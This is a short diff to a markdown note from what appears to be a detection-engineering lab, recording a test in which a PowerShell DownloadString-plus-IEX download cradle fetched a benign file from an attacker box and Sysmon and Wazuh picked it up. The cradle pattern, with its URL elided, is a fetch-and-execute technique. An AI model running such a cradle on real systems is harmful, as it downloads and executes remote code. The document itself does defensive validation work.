@@ -23,7 +23,7 @@ Host a benign text file on the attacker box and run a `DownloadString + IEX` cra
 
 Validated 2026-09-27 as part of the Flagship 2 Workstream 1 ART campaign
 (`flagships/f2-adversary-ad-lab/docs/campaign-log.md`,
-`flagships/f2-adversary-ad-lab/attack-tests/t1059-001-powershell-cradle.md`):
+`attack-tests/t1059-001-powershell-cradle.md`):
 ran a `(New-Object Net.WebClient).DownloadString(...)` + `IEX` cradle
 against a benign payload hosted on the attacker box from `windows-victim`.
 Sysmon EID 1 shipped with the full cradle in `CommandLine`; custom Wazuh
